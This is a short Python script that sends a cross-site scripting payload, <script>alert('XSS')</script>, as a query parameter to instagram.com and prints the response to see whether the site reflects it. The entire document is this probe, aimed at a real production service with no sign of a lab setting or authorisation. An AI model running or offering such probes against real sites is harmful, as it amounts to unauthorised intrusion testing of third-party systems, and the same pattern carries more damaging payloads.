import requests

url = "https://instagram.com/"
payload = "<script>alert('XSS')</script>"
params = {"q": payload}

response = requests.get(url, params=params)
print(response.text)